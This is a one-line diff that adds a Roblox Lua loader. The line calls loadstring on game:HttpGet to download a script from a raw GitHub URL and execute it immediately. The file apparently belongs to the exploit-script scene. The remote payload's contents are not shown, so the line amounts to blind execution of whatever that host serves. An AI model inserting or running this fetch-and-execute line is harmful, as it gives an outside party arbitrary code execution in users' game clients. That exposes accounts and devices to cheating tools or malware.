@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/anhthienv2-bot/test/main/Update2'))()
